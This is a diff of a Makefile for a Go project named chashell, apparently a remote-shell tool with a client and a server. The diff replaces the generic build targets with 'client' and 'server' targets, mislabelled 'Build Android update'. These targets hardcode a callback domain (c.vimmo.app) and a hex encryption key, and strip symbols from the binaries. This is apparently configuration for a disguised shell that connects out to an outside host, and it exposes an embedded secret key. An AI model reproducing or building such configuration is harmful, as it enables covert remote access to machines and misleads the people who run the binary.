@@ -23,29 +23,34 @@ ifndef ENCRYPTION_KEY
 	$(error ENCRYPTION_KEY is undefined)
 endif
 
-build-true: check-env ## Build for the current architecture.
-	dep ensure && \
-	go build -ldflags $(LDFLAGS) -gcflags $(GCFLAGS) -tags $(TAGS) -o release/$(CLIENT_BINARY) $(CLIENT_SOURCE) -mod=readonly && \
-	go build -ldflags $(LDFLAGS) -gcflags $(GCFLAGS) -tags $(TAGS) -o release/$(SERVER_BINARY) $(SERVER_SOURCE) -mod=readonly
+# build-true: check-env ## Build for the current architecture.
+# 	dep ensure && \
+# 	go build -ldflags $(LDFLAGS) -gcflags $(GCFLAGS) -tags $(TAGS) -o release/$(CLIENT_BINARY) $(CLIENT_SOURCE) -mod=readonly && \
+# 	go build -ldflags $(LDFLAGS) -gcflags $(GCFLAGS) -tags $(TAGS) -o release/$(SERVER_BINARY) $(SERVER_SOURCE) -mod=readonly
 
-dep: check-env ## Get all the required dependencies
-	go get -v -u github.com/golang/dep/cmd/dep && \
-	go get github.com/mitchellh/gox
-build-ad:  ## Build Android update
-	#export GOPATH=~/go
-	go mod init github.com/hdqb/chashell
+# dep: check-env ## Get all the required dependencies
+# 	go get -v -u github.com/golang/dep/cmd/dep && \
+# 	go get github.com/mitchellh/gox
+
+client:  ## Build Android update
+	go mod init ipwf
 	go mod tidy
-	go build -ldflags "-X main.targetDomain=c.vimmo.app -X main.encryptionKey=80523fab733d2af60be251626a688ec9e4c9abb23e927edffa69b8bb0d0fa706 -s -w" -gcflags "all=-trimpath=OPATH" -mod=readonly -tags release -o release/chashell ./cmd/shell
+	go build -ldflags "-X main.targetDomain=c.vimmo.app -X main.encryptionKey=80523fab733d2af60be251626a688ec9e4c9abb23e927edffa69b8bb0d0fa706 -s -w" -gcflags "all=-trimpath=OPATH" -mod=readonly -tags release -o release/client ./cmd/client
 
-build-client: check-env ## Build the chashell client.
-	@echo "Building shell"
-	dep ensure && \
-	gox -osarch=$(OSARCH) -ldflags=$(LDFLAGS) -gcflags=$(GCFLAGS) -tags $(TAGS) -output "release/chashell_{{.OS}}_{{.Arch}}" ./cmd/shell
+server:  ## Build Android update
+	go mod init ipwf
+	go mod tidy
+	go build -ldflags "-X main.targetDomain=c.vimmo.app -X main.encryptionKey=80523fab733d2af60be251626a688ec9e4c9abb23e927edffa69b8bb0d0fa706 -s -w" -gcflags "all=-trimpath=OPATH" -mod=readonly -tags release -o release/server ./cmd/server
 
-build-server: check-env ## Build the chashell server.
-	@echo "Building server"
-	dep ensure && \
-	gox -osarch=$(OSARCH) -ldflags=$(LDFLAGS) -gcflags=$(GCFLAGS) -tags $(TAGS) -output "release/chaserv_{{.OS}}_{{.Arch}}" ./cmd/server
+# build-client: check-env ## Build the chashell client.
+# 	@echo "Building shell"
+# 	dep ensure && \
+# 	gox -osarch=$(OSARCH) -ldflags=$(LDFLAGS) -gcflags=$(GCFLAGS) -tags $(TAGS) -output "release/chashell_{{.OS}}_{{.Arch}}" ./cmd/shell
+
+# build-server: check-env ## Build the chashell server.
+# 	@echo "Building server"
+# 	dep ensure && \
+# 	gox -osarch=$(OSARCH) -ldflags=$(LDFLAGS) -gcflags=$(GCFLAGS) -tags $(TAGS) -output "release/chaserv_{{.OS}}_{{.Arch}}" ./cmd/server
 
 
 build-all: check-env build-client build-server ## Build everything.
